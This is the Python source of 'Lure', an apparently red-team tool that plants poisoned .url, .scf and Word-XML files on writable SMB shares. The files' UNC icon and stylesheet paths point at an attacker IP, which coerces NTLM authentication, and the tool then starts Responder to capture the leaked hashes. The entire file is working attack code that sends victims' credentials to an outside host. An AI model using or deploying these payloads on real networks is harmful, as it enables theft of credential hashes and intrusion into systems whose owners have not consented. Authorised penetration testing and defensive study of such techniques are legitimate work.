#!/usr/bin/env python3
"""Lure — SMB Hash Bait.

Drops poisoned .url/.scf/.xml payloads onto writable SMB shares to coerce
NTLM authentication, then hands off to Responder for capture.
"""

import argparse
import shutil
import subprocess
import sys
from pathlib import Path

import colorama

from lure import __version__

# Catppuccin Mocha — water palette
TEAL     = "\033[38;2;148;226;213m"
SKY      = "\033[38;2;137;220;235m"
SAPPHIRE = "\033[38;2;116;199;236m"
BLUE     = "\033[38;2;137;180;250m"
LAVENDER = "\033[38;2;180;190;254m"
# Status colors (Catppuccin Mocha)
GREEN    = "\033[38;2;166;227;161m"
YELLOW   = "\033[38;2;249;226;175m"
RED      = "\033[38;2;243;139;168m"
MAGENTA  = "\033[38;2;203;166;247m"
RESET    = "\033[0m"


def _check_prereqs(needs_responder=True):
    """Verify required system tools are on $PATH. Exit 4 if missing."""
    missing = []
    if shutil.which("smbclient") is None:
        missing.append("smbclient")
    if needs_responder and shutil.which("responder") is None:
        missing.append("responder")
    if missing:
        print(RED + f"Missing required tool(s) on $PATH: {', '.join(missing)}" + RESET)
        print(YELLOW + f"Install on Kali / Debian: sudo apt install {' '.join(missing)}" + RESET)
        sys.exit(4)


def _banner():
    print(TEAL     + "   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(SKY      + "    _     _   _ ____  _____ ")
    print(SAPPHIRE + "   | |   | | | |  _ \\| ____|")
    print(BLUE     + "   | |   | | | | |_) |  _|  ")
    print(LAVENDER + "   | |___| |_| |  _ <| |___ ")
    print(SAPPHIRE + "   |_____|\\___/|_| \\_\\_____|")
    print(SKY      + "        ~ SMB Hash Bait ~     " + RESET)


def make_url(lhost, basename="@lure"):
    """Write an Internet shortcut payload that resolves an icon over UNC."""
    path = Path(f"{basename}.url")
    path.write_text(
        "[InternetShortcut]\n"
        "URL=whatever\n"
        "WorkingDirectory=whatever\n"
        f"IconFile=\\\\{lhost}\\%USERNAME%.icon\n"
        "IconIndex=1\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


def make_scf(lhost, basename="@lure"):
    """Write a shell command link payload that resolves an icon over UNC."""
    path = Path(f"{basename}.scf")
    path.write_text(
        "[Shell]\n"
        "Command=2\n"
        f"IconFile=\\\\{lhost}\\tools\\nc.ico\n"
        "[Taskbar]\n"
        "Command=ToggleDesktop\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


def make_xml(lhost, basename="@lure"):
    """Write a Word document payload pointing at a remote XSL over UNC."""
    path = Path(f"{basename}.xml")
    path.write_text(
        "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
        "<?mso-application progid='Word.Document'?>\n"
        f"<?xml-stylesheet type='text/xsl' href='\\\\{lhost}\\lure.xsl' ?>\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


def smb_put(host, share, payloads, *, delete=False, sub_dir=None,
            user=None, password=None, domain=None):
    """Upload (or delete) payload files on an SMB share via smbclient.

    Builds an argv list and invokes smbclient without a shell, so
    user-supplied values (host, share, sub_dir, credentials) cannot be
    interpreted as shell metacharacters.

    When delete=True, sends `del` commands instead of `put` — used by
    --cleanup to remove previously dropped payloads from the share.
    """
    cmd = ["smbclient", f"//{host}/{share}"]
    if user is not None and password is not None:
        principal = f"{domain}/{user}" if domain else user
        cmd.extend(["-U", principal, "--password", password])
    else:
        cmd.append("-N")  # anonymous

    # smbclient -c takes a script in smbclient's own command grammar
    # (";" separates commands). Filenames are double-quoted for paths
    # that may contain spaces.
    verb = "del" if delete else "put"
    script_parts = []
    if sub_dir:
        script_parts.append(f'cd "{sub_dir}"')
    script_parts.extend(f'{verb} "{p}"' for p in payloads)
    cmd.extend(["-c", "; ".join(script_parts)])

    action = "Deleting" if delete else "Uploading"
    target = f"//{host}/{share}" + (f"/{sub_dir}" if sub_dir else "")
    print(BLUE + f"[*] {action} {len(payloads)} payload(s) at {target}" + RESET)
    return subprocess.run(cmd).returncode


def run_responder(interface):
    """Hand off to Responder on the given interface."""
    print(BLUE + f"[*] Starting Responder on {interface}" + RESET)
    return subprocess.run(["sudo", "responder", "-I", interface, "-wv"]).returncode


def main():
    colorama.just_fix_windows_console()
    _banner()

    parser = argparse.ArgumentParser(
        prog="lure",
        description="Lure — SMB Hash Bait",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-r", "--RHOST", action="store", metavar="IP", help="Target SMB server (RHOST)")
    parser.add_argument("-l", "--LHOST", action="store", metavar="IP", help="Attacker IP embedded in payload UNC paths (LHOST)")
    parser.add_argument("-d", "--DOMAIN", action="store", metavar="NAME", help="Domain for authenticated upload")
    parser.add_argument("-i", "--Interface", action="store", metavar="IFACE", help="Network interface for Responder")
    parser.add_argument("-a", "--Share", action="store", metavar="NAME", help="Target share name")
    parser.add_argument("-o", "--Other", action="store", metavar="PATH", help="Subdirectory inside the share (when root is read-only)")
    parser.add_argument("-U", "--Username", action="store", metavar="USER", help="Username for authenticated upload")
    parser.add_argument("-P", "--Password", action="store", metavar="PASS", help="Password for authenticated upload")
    parser.add_argument("-u", "--url", action="store_true", help="Drop @lure.url payload")
    parser.add_argument("-s", "--scf", action="store_true", help="Drop @lure.scf payload")
    parser.add_argument("-x", "--xml", action="store_true", help="Drop @lure.xml payload")
    parser.add_argument("-A", "--All", action="store_true", help="Drop all three payloads (@lure.url, @lure.scf, @lure.xml)")
    parser.add_argument("--name", action="store", default="@lure", metavar="BASE", help="Payload basename (default keeps the @ prefix to sort to the top of directory listings)")
    parser.add_argument("--no-responder", dest="no_responder", action="store_true", help="Drop the payload only — skip the Responder handoff (use when you already have a listener running)")
    parser.add_argument("--cleanup", action="store_true", help="Delete previously dropped payloads from the share (uses the same payload-type and --name flags). Implies --no-responder.")

    if not sys.argv[1:]:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if not (args.scf or args.url or args.xml or args.All):
        print(YELLOW + "What do you want from me!!!" + RESET)
        parser.print_help()
        sys.exit(2)

    if args.Username is not None and args.Password is None:
        print(RED + "Need password if utilizing a username" + RESET)
        sys.exit(2)

    # --cleanup implies --no-responder (nothing to listen for).
    skip_responder = args.no_responder or args.cleanup
    _check_prereqs(needs_responder=not skip_responder)

    # Resolve which payloads the action applies to (explicit flags or --All).
    want_url = args.url or args.All
    want_scf = args.scf or args.All
    want_xml = args.xml or args.All

    if args.cleanup:
        # Don't regenerate locally — just compute the remote filenames.
        payloads = []
        if want_url:
            payloads.append(Path(f"{args.name}.url"))
        if want_scf:
            payloads.append(Path(f"{args.name}.scf"))
        if want_xml:
            payloads.append(Path(f"{args.name}.xml"))
    else:
        payloads = []
        if want_url:
            payloads.append(make_url(args.LHOST, args.name))
        if want_scf:
            payloads.append(make_scf(args.LHOST, args.name))
        if want_xml:
            payloads.append(make_xml(args.LHOST, args.name))

    rc = smb_put(
        args.RHOST,
        args.Share,
        payloads,
        delete=args.cleanup,
        sub_dir=args.Other,
        user=args.Username,
        password=args.Password,
        domain=args.DOMAIN,
    )
    if rc != 0:
        print(RED + f"[-] smbclient exited with code {rc}" + RESET)
        sys.exit(rc)

    if args.cleanup:
        print(GREEN + f"[+] Removed {len(payloads)} payload(s) from the share." + RESET)
        return
    if args.no_responder:
        print(GREEN + "[+] Payload(s) dropped. Skipping Responder (--no-responder)." + RESET)
        return
    run_responder(args.Interface)


if __name__ == "__main__":
    main()
